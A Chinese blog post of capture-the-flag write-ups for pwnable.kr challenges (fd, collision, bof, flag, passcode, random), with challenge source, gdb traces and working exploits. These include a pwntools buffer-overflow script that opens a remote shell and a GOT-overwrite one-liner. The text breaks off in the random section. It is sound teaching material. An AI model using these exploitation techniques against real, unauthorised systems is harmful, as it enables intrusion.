<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>一些pwn题目的解题思路[pwnable.kr] | WeaponX&#39;s Blog</title>
  <meta name="author" content="WeaponX">
  
  <meta name="description" content="Vulnerability|Security|Binary">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="一些pwn题目的解题思路[pwnable.kr]"/>
  <meta property="og:site_name" content="WeaponX&#39;s Blog"/>

  
    <meta property="og:image" content="undefined"/>
  

  <link href="/favicon.png" rel="icon">
  <link rel="alternate" href="/atom.xml" title="WeaponX&#39;s Blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  

  <script>
    var _hmt = _hmt || [];
    (function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?ab50f379bb6434641ee0125ce5d37f23";
    var s = document.getElementsByTagName("script")[0]; 
    s.parentNode.insertBefore(hm, s);
    })();
  </script>
  <script>
  (function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
   })();
   </script>
</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">WeaponX&#39;s Blog</a></h1>
  <h2><a href="/">Binary</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-02-13T15:55:00.000Z"><a href="/2017/02/13/一些pwn题目的解题思路-pwnable-kr/">2017-02-13</a></time>
      
      
  
    <h1 class="title">一些pwn题目的解题思路[pwnable.kr]</h1>
  

    </header>
    <div class="entry">
      
        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>以下是solution的目录</p>
<ul>
<li><a href="#fd" title="fd">#fd</a></li>
<li><a href="#collision" title="collision">#collision</a></li>
<li><a href="#bof" title="bof">#bof</a></li>
<li><a href="#flag" title="flag">#flag</a></li>
<li><a href="#passcode" title="passcode">#passcode</a></li>
<li><a href="#random" title="random">#random</a></li>
</ul>
<p>Other</p>
<p><a href="http://weaponx.site/2017/02/14/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9B%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-pwnable-kr-II/" title="一些pwn题目的解题思路[pwnable.kr] II">一些pwn题目的解题思路[pwnable.kr] II</a></p>
<a id="more"></a>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>根据题目描述，登录上服务器，ls一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">fd@ubuntu:~$ ls</div><div class="line">fd  fd.c  flag</div><div class="line">fd@ubuntu:~$ cat flag</div><div class="line">cat: flag: Permission denied</div></pre></td></tr></table></figure>
<p>肯定flag也不能直接读取，既然给了源代码，就顺便看一下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</div><div class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</div><div class="line">    len = read(fd, buf, <span class="number">32</span>);</div><div class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</div><div class="line">        system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这道题的考点就是<em>fd = 0</em>为linux下的标准输入。只要让<em>atoi(argv[1])-0x1234 = 0</em>即可，然后再输入<em>LETMEWIN</em>即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">fd@ubuntu:~$ ./fd 4660</div><div class="line">LETMEWIN</div><div class="line">good job :)</div><div class="line">mommy! I think I know what a file descriptor is!!</div></pre></td></tr></table></figure>
<h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>给了题目的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</div><div class="line">        res += ip[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</div><div class="line">        system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>逻辑很简单，把20个字符分成5组，每组四个。只要让5组的字符串的ascii加起来等于0x21DD09EC即可。</p>
<p>开始我的思路是分成0x21DD09EC和4组全0，但是过不了strlen的长度判断。只能变成四组0x01010101和一组0x1DD905E8。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">col@ubuntu:~$ python</div><div class="line">Python 2.7.12 (default, Jul  1 2016, 15:12:24) </div><div class="line">[GCC 5.4.0 20160609] on linux2</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; from pwn import *</div><div class="line">&gt;&gt;&gt; payload = p32(0x1dd905e8) + p32(0x01010101) * 4</div><div class="line">&gt;&gt;&gt; io = process([<span class="string">"./col"</span>, payload])</div><div class="line">[x] Starting <span class="built_in">local</span> process <span class="string">'./col'</span></div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./col'</span>: Done</div><div class="line">&gt;&gt;&gt; io.recv()</div><div class="line">[*] Process <span class="string">'./col'</span> stopped with <span class="built_in">exit</span> code 0</div><div class="line"><span class="string">'daddy! I just managed to create a hash collision :)\n'</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure>
<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</div><div class="line">    gets(overflowme);   <span class="comment">// smash me!</span></div><div class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</div><div class="line">        system(<span class="string">"/bin/sh"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    func(<span class="number">0xdeadbeef</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>一个典型的缓冲区溢出，只要把key覆盖没0xcafebabe即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xffffd63c (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">EBX: 0xf7<span class="built_in">fc</span>3000 --&gt; 0x1a6da8 </div><div class="line">ECX: 0xfbad2288 </div><div class="line">EDX: 0xf7<span class="built_in">fc</span>48a4 --&gt; 0x0 </div><div class="line">ESI: 0x0 </div><div class="line">EDI: 0x0 </div><div class="line">EBP: 0xffffd668 (<span class="string">"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">ESP: 0xffffd620 --&gt; 0xffffd63c (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">EIP: 0x8048525 (&lt;func+40&gt;:  cmp    DWORD PTR [ebp+0x8],0xcafebabe)</div><div class="line">EFLAGS: 0x286 (carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x804851a &lt;func+29&gt;: lea    eax,[ebp-0x2c]</div><div class="line">   0x804851d &lt;func+32&gt;: mov    DWORD PTR [esp],eax</div><div class="line">   0x8048520 &lt;func+35&gt;: call   0x80483a0 &lt;gets@plt&gt;</div><div class="line">=&gt; 0x8048525 &lt;func+40&gt;: cmp    DWORD PTR [ebp+0x8],0xcafebabe</div><div class="line">   0x804852c &lt;func+47&gt;: jne    0x804853c &lt;func+63&gt;</div><div class="line">   0x804852e &lt;func+49&gt;: mov    DWORD PTR [esp],0x804861f</div><div class="line">   0x8048535 &lt;func+56&gt;: call   0x80483d0 &lt;system@plt&gt;</div><div class="line">   0x804853a &lt;func+61&gt;: jmp    0x8048548 &lt;func+75&gt;</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd620 --&gt; 0xffffd63c (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">0004| 0xffffd624 --&gt; 0x0 </div><div class="line">0008| 0xffffd628 --&gt; 0xc2 </div><div class="line">0012| 0xffffd62c --&gt; 0xf7eb0716 (<span class="built_in">test</span>   eax,eax)</div><div class="line">0016| 0xffffd630 --&gt; 0xffffffff </div><div class="line">0020| 0xffffd634 --&gt; 0xffffd65e (<span class="string">"AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">0024| 0xffffd638 --&gt; 0xf7e28c34 --&gt; 0x2aad </div><div class="line">0028| 0xffffd63c (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">8       <span class="keyword">if</span>(key == 0xcafebabe)&#123;</div><div class="line">gdb-peda$ p <span class="variable">$ebp</span>+8</div><div class="line"><span class="variable">$1</span> = (void *) 0xffffd670</div><div class="line">gdb-peda$ x/20wx <span class="variable">$ebp</span>+8</div><div class="line">0xffffd670: 0x41474141  0x41416341  0x48414132  0x41644141</div><div class="line">0xffffd680: 0x41413341  0x65414149  0x41344141  0x41414a41</div><div class="line">0xffffd690: 0x35414166  0x414b4141  0x41416741  0x4c414136</div><div class="line">0xffffd6a0: 0x00000000  0xffffd724  0xffffd6c4  0x0804a024</div><div class="line">0xffffd6b0: 0x0804825c  0xf7<span class="built_in">fc</span>3000  0x00000000  0x00000000</div><div class="line">gdb-peda$ pattern_offset 0x41474141</div><div class="line">1095188801 found at offset: 52</div></pre></td></tr></table></figure>
<p>找到53-56个字节即可覆盖key。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">io = remote(<span class="string">"pwnable.kr"</span>, <span class="number">9000</span>)</div><div class="line">payload = <span class="string">"a"</span> * <span class="number">52</span> + p32(<span class="number">0xcafebabe</span>)</div><div class="line">io.sendline(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
<p>运行exploit：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~/pwn/pwnkr/3 » python exp.py</div><div class="line">[+] Opening connection to pwnable.kr on port 9000: Done</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">bof</div><div class="line">bof.c</div><div class="line">flag</div><div class="line"><span class="built_in">log</span></div><div class="line"><span class="built_in">log</span>2</div><div class="line">super.pl</div><div class="line">$ cat flag</div><div class="line">daddy, I just pwned a buFFer :)</div><div class="line">$</div></pre></td></tr></table></figure>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>一看bin，是经过upx加壳的，直接用upx脱壳。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~/pwn/pwnkr/4/upx-3.93-amd64_linux » ./upx <span class="_">-d</span> ../flag                                                            user@ubuntu</div><div class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</div><div class="line">                          Copyright (C) 1996 - 2017</div><div class="line">UPX 3.93        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 29th 2017</div><div class="line"></div><div class="line">        File size         Ratio      Format      Name</div><div class="line">   --------------------   ------   -----------   -----------</div><div class="line">    887219 &lt;-    335288   37.79%   linux/amd64   flag</div><div class="line"></div><div class="line">Unpacked 1 file.</div></pre></td></tr></table></figure>
<p>调试一下直接出flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x40118b &lt;main+39&gt;:  mov    rax,QWORD PTR [rbp-0x8]</div><div class="line">   0x40118f &lt;main+43&gt;:  mov    rsi,rdx</div><div class="line">   0x401192 &lt;main+46&gt;:  mov    rdi,rax</div><div class="line">=&gt; 0x401195 &lt;main+49&gt;:  call   0x400320</div><div class="line">   0x40119a &lt;main+54&gt;:  mov    eax,0x0</div><div class="line">   0x40119f &lt;main+59&gt;:  leave  </div><div class="line">   0x4011a0 &lt;main+60&gt;:  ret    </div><div class="line">   0x4011a1:    nop</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0x6c96b0 --&gt; 0x0 </div><div class="line">arg[1]: 0x496628 (<span class="string">"UPX...? sounds like a delivery service :)"</span>)</div><div class="line">arg[2]: 0x496628 (<span class="string">"UPX...? sounds like a delivery service :)"</span>)</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffe510 --&gt; 0x401a50 (&lt;__libc_csu_init&gt;:   push   r14)</div><div class="line">0008| 0x7fffffffe518 --&gt; 0x6c96b0 --&gt; 0x0 </div><div class="line">0016| 0x7fffffffe520 --&gt; 0x0 </div><div class="line">0024| 0x7fffffffe528 --&gt; 0x401344 (&lt;__libc_start_main+404&gt;: mov    edi,eax)</div><div class="line">0032| 0x7fffffffe530 --&gt; 0x0 </div><div class="line">0040| 0x7fffffffe538 --&gt; 0x100000000 </div><div class="line">0048| 0x7fffffffe540 --&gt; 0x7fffffffe618 --&gt; 0x7fffffffe852 (<span class="string">"/home/user/pwn/pwnkr/4/flag"</span>)</div><div class="line">0056| 0x7fffffffe548 --&gt; 0x401164 (&lt;main&gt;:  push   rbp)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">0x0000000000401195 <span class="keyword">in</span> main ()</div><div class="line">gdb-peda$</div></pre></td></tr></table></figure>
<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> passcode1;</div><div class="line">    <span class="keyword">int</span> passcode2;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</div><div class="line">    fflush(<span class="built_in">stdin</span>);</div><div class="line"></div><div class="line">    <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</div><div class="line">    <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</div><div class="line">        system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</div><div class="line"></div><div class="line">    welcome();</div><div class="line">    login();</div><div class="line"></div><div class="line">    <span class="comment">// something after login...</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>题目描述如下：</p>
<blockquote>
<p>Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!<br>Well, there was some compiler warning, but who cares about that?</p>
</blockquote>
<p>告诉我们注意下编译时的warning</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~/pwn/pwnkr/5 » gcc -m32 5.c -o 5</div><div class="line">5.c: In <span class="keyword">function</span> ‘login’:</div><div class="line">5.c:9:5: warning: format ‘%d’ expects argument of <span class="built_in">type</span> ‘int *’, but argument 2 has <span class="built_in">type</span> ‘int’ [-Wformat=]</div><div class="line">     scanf(<span class="string">"%d"</span>, passcode1);</div><div class="line">     ^</div><div class="line">5.c:14:9: warning: format ‘%d’ expects argument of <span class="built_in">type</span> ‘int *’, but argument 2 has <span class="built_in">type</span> ‘int’ [-Wformat=]</div><div class="line">         scanf(<span class="string">"%d"</span>, passcode2);</div></pre></td></tr></table></figure>
<p>很明显的错误，使用scanf输入int类型的时候没有添加取地址符。但是，这只能说是一个bug，并不能说是漏洞。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</div></pre></td></tr></table></figure>
<p>只要能控制passcode1的地址，就可以完成一个任意地址写。注意到login函数前面，有一个welcome函数，使用gdb调一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0x0 </div><div class="line">EBX: 0xf7<span class="built_in">fc</span>3000 --&gt; 0x1a6da8 </div><div class="line">ECX: 0x0 </div><div class="line">EDX: 0xf7<span class="built_in">fc</span>4898 --&gt; 0x0 </div><div class="line">ESI: 0x0 </div><div class="line">EDI: 0x0 </div><div class="line">EBP: 0xffffd668 --&gt; 0xffffd688 --&gt; 0x0 </div><div class="line">ESP: 0xffffd640 (<span class="string">"IAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">EIP: 0x80485b3 (&lt;login+6&gt;:  mov    DWORD PTR [esp],0x8048770)</div><div class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x80485ad &lt;login&gt;:   push   ebp</div><div class="line">   0x80485ae &lt;login+1&gt;: mov    ebp,esp</div><div class="line">   0x80485b0 &lt;login+3&gt;: sub    esp,0x28</div><div class="line">=&gt; 0x80485b3 &lt;login+6&gt;: mov    DWORD PTR [esp],0x8048770</div><div class="line">   0x80485ba &lt;login+13&gt;:    call   0x8048420 &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line">   0x80485bf &lt;login+18&gt;:    mov    eax,DWORD PTR [ebp-0x10]</div><div class="line">   0x80485c2 &lt;login+21&gt;:    mov    DWORD PTR [esp+0x4],eax</div><div class="line">   0x80485c6 &lt;login+25&gt;:    mov    DWORD PTR [esp],0x8048783</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd640 (<span class="string">"IAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">0004| 0xffffd644 (<span class="string">"AA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">0008| 0xffffd648 (<span class="string">"AJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">0012| 0xffffd64c (<span class="string">"fAA5AAKAAgAA6AAL"</span>)</div><div class="line">0016| 0xffffd650 (<span class="string">"AAKAAgAA6AAL"</span>)</div><div class="line">0020| 0xffffd654 (<span class="string">"AgAA6AAL"</span>)</div><div class="line">0024| 0xffffd658 (<span class="string">"6AAL"</span>)</div><div class="line">0028| 0xffffd65c --&gt; 0xb7a3f600 </div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 1, login () at 5.c:8</div><div class="line">8       <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</div><div class="line">gdb-peda$ x/wx <span class="variable">$ebp</span>-0x10</div><div class="line">0xffffd658: 0x4c414136</div><div class="line">gdb-peda$ x/20wx <span class="variable">$ebp</span>-0x10</div><div class="line">0xffffd658: 0x4c414136  0xb7a3f600  0x00000000  0x00000000</div><div class="line">0xffffd668: 0xffffd688  0x080486c8  0x080487f0  0xf7ffd000</div><div class="line">0xffffd678: 0x080486eb  0xf7<span class="built_in">fc</span>3000  0x080486e0  0x00000000</div><div class="line">0xffffd688: 0x00000000  0xf7e35ad3  0x00000001  0xffffd724</div><div class="line">0xffffd698: 0xffffd72c  0xf7feacca  0x00000001  0xffffd724</div><div class="line">gdb-peda$ pattern_offset 0x4c414136</div><div class="line">1279344950 found at offset: 96</div></pre></td></tr></table></figure>
<p>可以看出welcome函数输入的第97-100个字节正好覆盖掉passcode1的地址，所以这就是一个任意地址写。但是程序有Canary，不过没关系，因为canary的第一个字节也是0x00。所以，剩下的思路就是GOT覆盖，覆盖printf的GOT表。可以选择用system覆盖，传入<em>/bin/sh</em>反弹一个shell。不过程序中已经有了读取flag的代码，直接用就可以了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">80485ce:   81 7d f4 c9 07 cc 00    cmpl   <span class="variable">$0xcc07c9</span>,-0xc(%ebp)</div><div class="line">80485d5:   75 1a                   jne    80485f1 &lt;login+0x8d&gt;</div><div class="line">80485d7:   c7 04 24 a5 87 04 08    movl   <span class="variable">$0x80487a5</span>,(%esp)</div><div class="line">80485de:   e8 6d fe ff ff          call   8048450 &lt;puts@plt&gt;</div><div class="line">80485e3:   c7 04 24 af 87 04 08    movl   <span class="variable">$0x80487af</span>,(%esp)</div><div class="line">80485ea:   e8 71 fe ff ff          call   8048460 &lt;system@plt&gt;</div><div class="line">80485ef:   c9                      leave  </div><div class="line">80485f0:   c3                      ret    </div><div class="line">80485f1:   c7 04 24 bd 87 04 08    movl   <span class="variable">$0x80487bd</span>,(%esp)</div><div class="line">80485f8:   e8 53 fe ff ff          call   8048450 &lt;puts@plt&gt;</div><div class="line">80485fd:   c7 04 24 00 00 00 00    movl   <span class="variable">$0x0</span>,(%esp)</div><div class="line">8048604:   e8 77 fe ff ff          call   8048480 &lt;<span class="built_in">exit</span>@plt&gt;</div></pre></td></tr></table></figure>
<p>读flag代码的地址为<em>0x80485e3i</em>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">passcode@ubuntu:~$ python -c <span class="string">"print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'"</span> | ./passcode</div><div class="line">Toddler<span class="string">'s Secure Login System 1.0 beta.</span></div><div class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</div><div class="line">Sorry mom.. I got confused about scanf usage :(</div><div class="line">enter passcode1 : Now I can safely trust you that you have credential :)</div></pre></td></tr></table></figure>
<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</div><div class="line">        random = rand();        <span class="comment">// random value!</span></div><div class="line"></div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</div><div class="line">                system(<span 